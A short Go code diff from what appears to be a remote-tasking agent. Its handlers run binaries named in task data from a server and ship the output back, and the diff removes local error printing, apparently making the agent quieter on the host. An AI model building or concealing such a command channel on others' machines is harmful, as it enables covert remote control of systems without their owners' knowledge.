@@ -2,7 +2,6 @@ package main
 
 import (
 	"bytes"
-	"fmt"
 	"os"
 	"os/exec"
 	"strings"
@@ -12,7 +11,6 @@ func ExecBgHandler(serverUrl string, taskData map[string]interface{}) {
 	binary := strings.Split(taskData["args"].(string), " ")
 	output, err := execBinary(binary[0], binary[1:], true)
 	if err != nil {
-		fmt.Println("Error executing binary:", err)
 		DataShipper(serverUrl, taskData, err.Error())
 		return
 	}
@@ -23,7 +21,6 @@ func ExecFgHandler(serverUrl string, taskData map[string]interface{}) {
 	binary := strings.Split(taskData["args"].(string), " ")
 	output, err := execBinary(binary[0], binary[1:], false)
 	if err != nil {
-		fmt.Println("Error executing binary:", err)
 		DataShipper(serverUrl, taskData, err.Error())
 		return
 	}
